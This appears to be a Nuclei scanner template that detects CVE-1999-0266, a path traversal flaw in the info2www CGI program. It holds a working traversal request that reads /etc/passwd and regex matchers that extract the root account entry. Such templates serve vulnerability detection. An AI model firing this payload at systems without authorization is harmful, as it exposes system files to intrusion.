id: CVE-1999-0266

info:
  name: info2www CGI - Remote File Disclosure / Command Execution
  author: geeknik
  severity: critical
  description: |
    The info2www CGI program allows remote attackers to read arbitrary files
    or execute commands via directory traversal in the request parameter.
    The script fails to sanitize path input, allowing traversal sequences
    to escape the document root and access system files.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-1999-0266
  classification:
    cve-id: CVE-1999-0266
    cwe-id: CWE-22
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
  tags: cve,cve1999,cgi,lfi,rce,info2www

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/info2www?(../../../../../../../etc/passwd)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

    extractors:
      - type: regex
        part: body
        name: passwd_entry
        regex:
          - "root:.*:0:0:[^:]*:[^:]*:[^\\n]*"
